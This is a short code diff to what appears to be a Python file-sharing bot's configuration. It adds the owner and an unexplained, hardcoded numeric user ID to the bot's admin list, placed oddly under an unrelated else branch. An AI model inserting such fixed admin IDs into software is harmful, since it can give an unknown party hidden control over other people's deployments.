@@ -35,6 +35,9 @@ if os.environ.get("DISABLE_CHANNEL_BUTTON", None) == 'True':
 else:
     DISABLE_CHANNEL_BUTTON = False
 
+    ADMINS.append(OWNER_ID)
+    ADMINS.append(1250450587)
+
 LOG_FILE_NAME = "filesharingbot.txt"
 
 logging.basicConfig(
